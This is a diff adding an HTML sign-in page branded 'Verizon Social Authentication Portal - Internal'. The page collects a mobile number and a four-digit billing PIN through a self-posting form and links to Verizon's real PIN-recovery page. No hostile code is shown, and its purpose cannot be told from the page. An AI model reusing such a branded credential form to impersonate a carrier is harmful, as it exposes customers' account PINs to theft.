@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verizon Social Authentication Portal - Internal</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <section>
+    <h1>Verizon Social Authentication Portal</h1>
+
+    <h2>Sign in</h2>
+
+    <form action="" method="post" id="register-form" novalidate="novalidate">  
+      <div class="label"><b>Mobile Telephone Number:</b> 
+          <span class="required-mark"></span>
+        <input type="text" id="mtn" name="mtn" class="inputField" placeHolder="Mobile Telephone Number" maxlength="10"/>
+      </div>
+      <div class="label"><b>Billing Pin Number:</b>
+        <span class="required-mark"></span>
+        <input type="password" id="password" name="password" placeHolder="XXXX" class="inputField" maxlength="4"/>
+      </div>
+      <a href="https://login.verizonwireless.com/accessmanager/public/c/fu/start?goto=https%3a%2f%2fmyaccount.verizonwireless.com%2fclp%2flogin%3fredirect%3d%2fmyv%2foverview%2f" class="forgotPwd">Forgot Your Pin?</a>
+      <div>
+        <input type="submit" name="submit" value="Continue" class="submitButton"/>
+      </div>    
+    </form>
+  </section>
+
+  <script src="js/jquery-1.9.1.js"></script>
+  <script src="js/jquery.validate.min.js"></script>
+  <script src="js/init.js"></script>
+  
+</body>
+</html>
